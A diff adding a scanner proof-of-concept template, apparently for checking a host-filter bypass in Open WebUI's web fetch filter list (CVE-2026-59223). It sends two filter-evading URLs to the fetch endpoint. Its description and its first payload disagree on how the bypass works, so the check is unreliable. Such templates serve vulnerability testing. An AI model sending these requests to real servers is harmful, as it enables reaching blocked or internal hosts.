@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 0.10.0 之前版本中 WEB_FETCH_FILTER_LIST 的 host 过滤绕过漏洞。由于 is_string_allowed 使用 str.endswith() 对完整 URL 进行匹配而非解析后的主机名，攻击者可通过在 URL 路径中添加目标域名绕过阻止列表（如 https://blocked.example/x 以 /x 结尾而非 blocked.example），或利用非标签边界匹配绕过允许列表（如 evilcorp.com 匹配 corp.com）。发送一个应被阻止的 URL 到 web fetch 接口，若返回成功则说明存在绕过。"
+id = "POC-AVE-2026-0822"
+name = "Open WebUI WEB_FETCH_FILTER_LIST 主机过滤绕过 PoC"
+severity = "medium"
+tags = ["ave-2026-0822"]
+vuln_id = [
+    "CVE-2026-59223",
+    "AVE-2026-0822",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/retrieval/web/fetch"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"https://internal.example.com/../blocked.example.com"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "content",
+    "text",
+    "success",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/retrieval/web/fetch"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"https://evilcorp.com"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "content",
+    "text",
+    "success",
+]
